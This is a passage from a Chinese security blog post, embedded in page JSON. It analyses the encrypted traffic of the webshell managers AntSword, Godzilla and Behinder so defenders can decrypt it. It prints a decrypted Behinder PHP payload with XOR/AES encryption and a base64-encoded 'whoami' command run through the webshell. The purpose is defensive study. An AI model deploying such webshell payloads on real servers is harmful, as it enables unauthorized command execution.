punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">extension_loaded</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'openssl'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \t<span class=\"token punctuation\">{</span>\n    \t\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    \t\t\t <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n    \t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n    \t<span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n    \t<span class=\"token punctuation\">{</span>\n    \t\t<span class=\"token keyword\">return</span> <span class=\"token function\">openssl_encrypt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"AES128\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Y2QgL2QgIkQ6XHBocHN0dWR5X3Byb1xXV1dcIiZ3aG9hbWk=\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$path</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"RDovcGhwc3R1ZHlfcHJvL1dXVy8=\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$path</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>而cmd内容即为执行内容：</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">cd <span class=\"token operator\">/</span>d <span class=\"token string\">\"D:\\phpstudy_pro\\WWW\\\"</span>&amp;whoami<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"小小总结\"><a href=\"#小小总结\" class=\"headerlink\" title=\"小小总结\"></a>小小总结</h2><p>这些webshell被大家所使用不仅仅是在当时出现时可绕过大部分流量检测，独特的请求方式，和免杀，还有他们与时俱进的各种功能，内网穿透、内存马等等，实现一键去日内网，随着检测手段加强和内网利用手段的增多，相信也会有新的绕过方法和功能出现。</p>\n<h1 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h1><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">https<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.freebuf.com/sectool/285693.html</span>\nhttps<span class=\"token punctuation\">:</span><span class=\"token comment\">//xz.aliyun.com/t/10556</span>\nhttp<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.wjhsh.net/0daybug-p-12004574.html</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n","text":"前言webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过其waf、ids等安全设备的连接，这里简单说下蚁剑、哥斯拉、冰蝎3.0这三款较为流行的工具在默认情况下的流量加密方式和解密方法，可以帮助守方在复盘时更好的攻击链还原和检测。 蚁剑蚁剑的加密手段比较简单，在配置界面的加密手段只有base64和rot13，这两者都是无需密钥可直接进行解密的密码类型，这里以base64为例：提取参数后的编码直接进行base64...","link":"","photos":[],"count_time":{"symbolsCount":"49k","symbolsTime":"45 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%9A%81%E5%89%91\"><span class=\"toc-text\">蚁剑</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%93%A5%E6%96%AF%E6%8B%89\"><span class=\"toc-text\">哥斯拉</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#PHP-XOR-BASE64\"><span class=\"toc-text\">PHP_XOR_BASE64</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#PHP-EVEAL-XOR-BASE64\"><span class=\"toc-text\">PHP_EVEAL_XOR_BASE64</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#PHP-XOR-RAW\"><span class=\"toc-text\">PHP_XOR_RAW</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%B0%E8%9D%8E3-0\"><span class=\"toc-text\">冰蝎3.0</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E5%B0%8F%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">小小总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A\"><span class=\"toc-text\">参考链接：</span></a>","author":{"name":"KID","slug":"kid","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/KID.5419jujfw8s0.jpg","link":"https://rainsec.cn","description":"","socials":{}},"mapped":true,"prev_post":{"title":"Fuzzing之Grammars","uid":"001f56a1173240fc9f846bb4717903d4","slug":"Fuzzing之Grammers","date":"2022-07-31T08:42:45.000Z","updated":"2023-04-11T11:39:14.837Z","comments":true,"path":"api/articles/Fuzzing之Grammers.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/fuzzinggrammar.jpeg","text":"Fuzzing之GrammarsFuzzing input​ Fuzzing的一大核心思想其实就是通过大量的Input去触发程序的各个分支逻辑，因此Fuzzing的成功与否和Input的生成关系密切。Input的格式多种多样，可以是文件，代码，json数据等等。但是各种各样的数据都有自己的格式，程序的输入也是如此，那么在生成Input的过程中，格式化非常关键，程序无法接受的输入对于Fuzzing来说是毫无意义的。 ​ 为了很好的描述一个程序的输入，一个很有必要的事情是为输入制定一些语法规范。比如...","link":"","photos":[],"count_time":{"symbolsCount":"35k","symbolsTime":"32 mins."},"categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":6,"path":"api/categories/漏洞挖掘.json"}],"tags":[{"name":"Fuzz","slug":"Fuzz","count":4,"path":"api/tags/Fuzz.json"}],"author":{"name":"Clock","slug":"clock","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/clocklogo.jpg","link":"https://rainsec.cn","description":"","socials":{}}},"next_post":{"title":"Linux Kernel 保护机制绕过","uid":"ca9ebcc3809bcde27e81d904c30455e1","slug":"Linux Kernel 保护机制绕过","date":"2022-07-19T10:48:45.000Z","updated":"2023-04-11T11:39:44.197Z","comments":true,"path":"api/articles/Linux Kernel 保护机制绕过.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/kernelcover.png","text":"Linux Kernel 保护机制绕过 好久没搞kernel的洞了，最近分析的这方面的洞有点多，相关的Exp任务也比较多，因此学习总结一下方便查找和记忆。 SMEP + KPTI bypass​ SMEP是SupervisorModeExecutionPrevention的缩写，主要的作用其实就是抵御类似ret2user这样的攻击，简单来说就是阻止内核执行用户态传递的代码。 ​ 检测计算机是否开启SMEP保护的方式很简单，cat /proc/cpuinfo | grep smep，如果有匹配到一...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"12 mins."},"categories":[{"name":"Linux Kernel","slug":"Linux-Kernel","count":1,"path":"api/categories/Linux-Kernel.json"}],"tags":[{"name":"Linux Kernel","slug":"Linux-Kernel","count":1,"path":"api/tags/Linux-Kernel.json"}],"author":{"name":"Clock","slug":"clock","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/clocklogo.jpg","link":"https://rainsec.cn","description":"","socials":{}}}}